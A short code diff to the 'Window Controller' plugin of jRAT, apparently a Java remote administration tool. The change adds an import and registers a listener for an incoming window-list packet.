@@ -1,6 +1,7 @@
 package se.jrat.plugin.window.client;
 
 import jrat.api.Plugin;
+import jrat.api.net.Packet;
 
 public class WindowPlugin extends Plugin {
 	
@@ -8,6 +9,8 @@ public class WindowPlugin extends Plugin {
 
 	public WindowPlugin() {
 		super("Window Controller", "1.0", "Window Controller Plugin", "jRAT");
+		
+		Packet.registerIncoming(HEADER_LIST, new ListPacketListener());
 	}
 
 }
